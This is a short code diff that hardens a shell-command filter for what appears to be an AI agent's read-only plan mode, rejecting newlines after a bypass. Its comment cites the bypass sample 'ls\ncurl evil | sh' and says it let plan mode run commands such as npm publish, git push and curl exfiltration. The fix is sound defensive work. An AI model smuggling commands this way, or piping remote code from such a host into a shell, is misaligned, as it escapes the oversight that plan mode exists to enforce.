@@ -170,6 +170,14 @@ function hasDisallowedShellMeta(command: string): boolean {
     return true;
   }
 
+  // A NEWLINE (or CR) starts a fresh command the `&&`/`;` segmenter below never
+  // splits on — `ls\ncurl evil | sh` read as ONE "segment" whose head is a
+  // benign `ls`, so plan mode ran arbitrary non-destructive commands (npm
+  // publish, git push, curl exfil). A plan-mode probe is always one line.
+  if (/[\n\r]/u.test(command)) {
+    return true;
+  }
+
   // Trailing or lone `&` (background) — not `&&`.
   return /(?:^|[^&])&(?:[^&]|$)/u.test(command);
 }
